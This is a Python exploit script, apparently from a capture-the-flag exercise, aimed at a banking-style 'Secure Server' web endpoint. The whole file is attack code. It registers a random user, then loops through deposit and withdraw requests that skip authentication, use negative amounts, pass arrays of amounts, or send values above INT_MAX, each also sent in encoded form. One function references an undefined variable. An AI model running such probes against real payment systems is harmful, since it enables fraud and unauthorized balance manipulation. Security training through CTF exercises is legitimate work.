#!/usr/bin/python3

import requests
import urllib.parse
import argparse
import sys, os
import random
import binascii
import time
import string
import urllib

headers = {
        "Host" : "10.1.2.5",
        "User-Agent" : "curl.7.72.0",
        "Connection": "Keep-Alive",
        "Cache-Control": "no-cache"
    }

registered_users={}

def usage():
    print("Exploiter script for Secure Server cctft")
    print("")
    print("Usage: ./exploiter.py ")
    print("-d --destination             - Ip of destination")
    print("-p --port                    - Destination port")
    print("")
    print("Example: ./exploiter.py -d 10.1.5.2 -p 80")
    sys.exit(0)

def get_random_string(length):
    letters = string.ascii_letters
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def urlencode(str):
  return urllib.parse.quote(str)

def check_home(user, password, url):
    params = {
        'user': user,
        'pass': password,
        'drop': "balance"
    }
    r = requests.get(url, headers=headers, params=params)
    print(r.text)

def register(url):
    global registered_users

    user_registered = get_random_string(random.randint(5,15))
    password_registered = get_random_string(random.randint(4,10))

    registered_users[user_registered] = password_registered

    print("=====================Registering user {}============================".format(user_registered))

    params = {
        'user': user_registered,
        'pass': password_registered,
        'drop': "register"
    }

    r = requests.get(url, headers=headers, params=params)
    print("Payload: {}".format(r.url))
    if r.status_code == 200:
        check_home(user_registered, password_registered, url)
    else:
        print("Application responded with code {}".format(r.status_code))

    print("====================================================================")


def no_auth_operation(url, operation, encode):
    user_not_registered = get_random_string(random.randint(4,15))
    password_not_registered = get_random_string(random.randint(4,10))

    while user_not_registered in registered_users.keys():
        user_not_registered = usernames[random.randint(0,9)]
    
    print("=====================Non authenticated operation============================")

    params = {}

    if encode:
        params = {
            'user': '%' + '%'.join("{:02x}".format(c) for c in user_not_registered.encode()),
            'pass': '%' + '%'.join("{:02x}".format(c) for c in password_not_registered.encode()),
            'drop': '%' + '%'.join("{:02x}".format(c) for c in operation.encode()),
            'amount': '%' + '%'.join("{:02x}".format(c) for c in str(random.randint(-2147483647,2147483647)).encode())
        }
    else:    
        params = {
            'user': user_not_registered,
            'pass': password_not_registered,
            'drop': operation,
            'amount': random.randint(-2147483647, 2147483647)
        }
     
    r = requests.get(url, headers=headers, params=params)
    print(r.url)
    if r.status_code == 200:
        check_home(user_not_registered, password_not_registered, url)
    else:
        print("Payload caused the application to respond with code {}".format(r.status_code))
    print("============================================================================")

def negative_amount_exploit(url, drop, encode):
    username = list(registered_users.keys())[0]
    password = registered_users[username]
    
    params = {
        'user': username,
        'pass': password,
        'drop': drop
    }

    if encode:
        encoded_amount = '%'.join(list(map(str,map(ord,str(random.randint(-2147483647,-1))))))
        params["amount"] = encoded_amount
    else:   
        params["amount"] = random.randint(-2147483647,-1)

    print("============================Trying to insert negative amount==========================")
    r = requests.get(url, headers = headers, params=params)
    print("Payload: {}".format(r.url))
    if r.status_code == 200:
        check_home(username, password, url)
    else:
        print("Payload caused the application to respond with code {}".format(r.status_code))
    print("=======================================================================================")

def multiple_amounts_exploit(url, drop, encode):
    username = list(registered_users.keys())[0]
    password = registered_users[username]

    params = {
        'user': username,
        'pass': password,
        'drop': drop
    }

    amount_value1 = str(random.randint(-2147483647,2147483647))
    amount_value2 = str(random.randint(-2147483647,2147483647))
    amount_value3 = str(random.randint(-2147483647,2147483647))

    if encode:
        amount_value1 = '%'.join(list(map(str,map(ord,amount_value1))))
        amount_value2 = '%'.join(list(map(str,map(ord,amount_value2))))
        amount_value3 = '%'.join(list(map(str,map(ord,amount_value3))))
        amount = [amount_value1, amount_value2, amount_value3]
    else:
        amount = [amount_value1, amount_value2, amount_value3]

    params['amount'] = amount

    print("=========================Trying amount array========================================")
    r = requests.get(url, headers=headers, params=params)
    print("Payload: {}".format(r.url))
    if r.status_code == 200:
        check_home(username, password, url)
    else:
        print("Payload caused the application to respond with code {}".format(r.status_code))

    print("====================================================================================")

def large_amount_exploit(url, drop, encode):
    username = list(registered_users.keys())[0]
    password = registered_users[username]

    INT_MAX = 2147483647

    params = {
        'user': username,
        'pass': password,
        'drop' : drop
    }

    if encode:
        amount = '%'.join(list(map(str,map(ord,str(INT_MAX + random.randint(0,INT_MAX))))))
    else:
        amount = INT_MAX + random.randint(0, INT_MAX)

    params['amount'] = amount

    print("=========================Trying very large amount========================================")
    r = requests.get(url, headers=headers, params=params)
    print("Payload: {}".format(r.url))
    if r.status_code == 200:
        check_home(username, password, url)
    else:
        print("Payload caused the application to respond with code {}".format(r.status_code))

    print("=========================================================================================")



def main():
    parser = argparse.ArgumentParser(description="Exploiter script for Secure Server cctf")
    parser.add_argument("-d", "--destination", help="Destination IP Address")
    parser.add_argument("-p", "--port", default=80, help="Destinatin Port")
    args = parser.parse_args()

    if not len(sys.argv[1:]):
        usage()

    destination_ip = args.destination
    destination_port = int(args.port)
    url = "http://{}:{}/process.php".format(destination_ip, destination_port)
    
    try:
        register(url)
        while True:
            time.sleep(1)
            no_auth_operation(url, "deposit", False)
            time.sleep(1)
            no_auth_operation(url, "deposit", True)
            time.sleep(1)
            no_auth_operation(url, "withdraw", False)
            time.sleep(1)
            no_auth_operation(url, "withdraw", True)
            time.sleep(1)

            negative_amount_exploit(url, "deposit", False)
            time.sleep(1)
            negative_amount_exploit(url, "deposit", True)
            time.sleep(1)
            negative_amount_exploit(url, "withdraw", False)
            time.sleep(1)
            negative_amount_exploit(url, "withdraw", True)
            time.sleep(1)

            multiple_amounts_exploit(url, "deposit", False)
            time.sleep(1)
            multiple_amounts_exploit(url, "deposit", True)
            time.sleep(1)
            multiple_amounts_exploit(url, "withdraw", False)
            time.sleep(1)
            multiple_amounts_exploit(url, "withdraw", True)
            time.sleep(1)

            large_amount_exploit(url, "deposit", False)
            time.sleep(1)
            large_amount_exploit(url, "deposit", True)
            time.sleep(1)
            large_amount_exploit(url, "withdraw", False)
            time.sleep(1)
            large_amount_exploit(url, "withdraw", True)
    except KeyboardInterrupt:
        print('Operation interrupted by user')
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)


if __name__ == "__main__":
    main()